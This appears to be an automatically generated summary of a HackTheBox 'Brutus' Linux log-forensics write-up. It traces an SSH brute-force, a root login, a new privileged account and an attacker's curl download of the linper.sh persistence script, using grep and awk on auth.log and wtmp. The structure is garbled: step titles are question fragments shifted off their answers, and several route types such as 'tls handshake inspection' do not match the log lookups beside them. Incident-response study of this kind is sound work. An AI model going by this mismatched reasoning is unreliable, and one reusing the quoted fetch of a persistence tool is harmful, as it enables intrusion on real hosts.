# Brutus

## Case Metadata

- Category: `Endpoint Forensics`
- Platform: `HackTheBox`
- Difficulty: `Easy`
- Source PDF: `https://github.com/tim-barc/ctf_writeups/blob/main/writeups/brutus.pdf`

## Why This Case Matters

Use this case as a Endpoint Forensics reference for linux-logs challenges.

## Input Signals

- Artifacts: linux-logs
- Tools: not detected
- Techniques: http-analysis, service-enumeration

## First-Principles Route

- Start from artifact inventory: event logs, registry hives, browser data, file system timelines, memory, and application databases.
- Build a timeline around the suspicious user, process, file path, login, persistence item, or network connection.
- Correlate logs with file and registry evidence before trusting one artifact alone.
- Extract concrete indicators such as process names, command lines, hashes, timestamps, users, and persistence locations.

## Solve Thinking

### Step 1: User

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use the artifact-specific tool with the extracted filter/query `awk '{print $5}' auth.log | sed -E 's/\[.*\]//; s/[:]*$//' | sort | uniq -c` and inspect the matching evidence.
- Filters or commands:
  - `awk '{print $5}' auth.log | sed -E 's/\[.*\]//; s/[:]*$//' | sort | uniq -c`
  - `| sort -n -r`
  - `grep "authentication failure" auth.log`
  - `grep "authentication failure" auth.log | awk '{print $14}' | sort | uniq -c`
- Reasoning chain:
  - Recognize the goal as credential discovery.
  - Use the artifact-specific tool with the extracted filter/query `awk '{print $5}' auth.log | sed -E 's/\[.*\]//; s/[:]*$//' | sort | uniq -c` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `65.2.161.68`

### Step 2: server. What is the username of the account?

- Route type: `evidence lookup`
- Why: For Endpoint Forensics, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
- Reasoning chain:
  - Recognize the goal as evidence lookup.
  - Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
  - The proof is the smallest artifact field that directly answers the goal.
- Evidence rule: The proof is the smallest artifact field that directly answers the goal.

### Step 3: user. If you grep for “Accepted Password” we can see that a successful authentication for root

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use the artifact-specific tool with the extracted filter/query `grep "Accepted password" auth.log` and inspect the matching evidence.
- Filters or commands:
  - `grep "Accepted password" auth.log`
- Reasoning chain:
  - Recognize the goal as credential discovery.
  - Use the artifact-specific tool with the extracted filter/query `grep "Accepted password" auth.log` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `root`

### Step 4: Identify the UTC timestamp when the attacker logged in manually to the server and

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use the artifact-specific tool with the extracted filter/query `TZ=UTC python3 utmp.py wtmp | grep "root" | grep "65.2.161.68"` and inspect the matching evidence.
- Filters or commands:
  - `TZ=UTC python3 utmp.py wtmp | grep "root" | grep "65.2.161.68"`
  - `SSH login sessions are tracked and assigned a session number upon login. What is the`
- Reasoning chain:
  - Recognize the goal as credential discovery.
  - Use the artifact-specific tool with the extracted filter/query `TZ=UTC python3 utmp.py wtmp | grep "root" | grep "65.2.161.68"` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `2024-03-06 06:32:45`

### Step 5: session number assigned to the attacker's session for the user account from Question 2?

- Route type: `tls handshake inspection`
- Why: TLS questions usually require filtering the specific handshake and reading the requested field directly.
- Probe: Use the artifact-specific tool with the extracted filter/query `grep "New session" auth.log` and inspect the matching evidence.
- Filters or commands:
  - `grep "New session" auth.log`
- Reasoning chain:
  - Recognize the goal as tls handshake inspection.
  - Use the artifact-specific tool with the extracted filter/query `grep "New session" auth.log` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.

### Step 6: root user.

- Route type: `evidence lookup`
- Why: For Endpoint Forensics, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
- Reasoning chain:
  - Recognize the goal as evidence lookup.
  - Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `37`

### Step 7: this new user account higher privileges. What is the name of this account?

- Route type: `timeline reconstruction`
- Why: Timeline questions should be answered from normalized artifact timestamps with timezone assumptions recorded.
- Probe: Use the artifact-specific tool with the extracted filter/query `grep "useradd" auth.log` and inspect the matching evidence.
- Filters or commands:
  - `grep "useradd" auth.log`
- Reasoning chain:
  - Recognize the goal as timeline reconstruction.
  - Use the artifact-specific tool with the extracted filter/query `grep "useradd" auth.log` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `cyberjunkie`

### Step 8: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

- Route type: `evidence lookup`
- Why: For Endpoint Forensics, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
- Reasoning chain:
  - Recognize the goal as evidence lookup.
  - Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `T1136.001`

### Step 9: What time did the attacker's first SSH session end according to auth.log?

- Route type: `tls handshake inspection`
- Why: TLS questions usually require filtering the specific handshake and reading the requested field directly.
- Probe: Use the artifact-specific tool with the extracted filter/query `grep "Removed session 37" auth.log` and inspect the matching evidence.
- Filters or commands:
  - `grep "Removed session 37" auth.log`
- Reasoning chain:
  - Recognize the goal as tls handshake inspection.
  - Use the artifact-specific tool with the extracted filter/query `grep "Removed session 37" auth.log` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `2024-03-06 06:37:24`

### Step 10: download a script. What is the full command executed using sudo?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use the artifact-specific tool with the extracted filter/query `grep "cyberjunkie" auth.log` and inspect the matching evidence.
- Filters or commands:
  - `grep "cyberjunkie" auth.log`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use the artifact-specific tool with the extracted filter/query `grep "cyberjunkie" auth.log` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
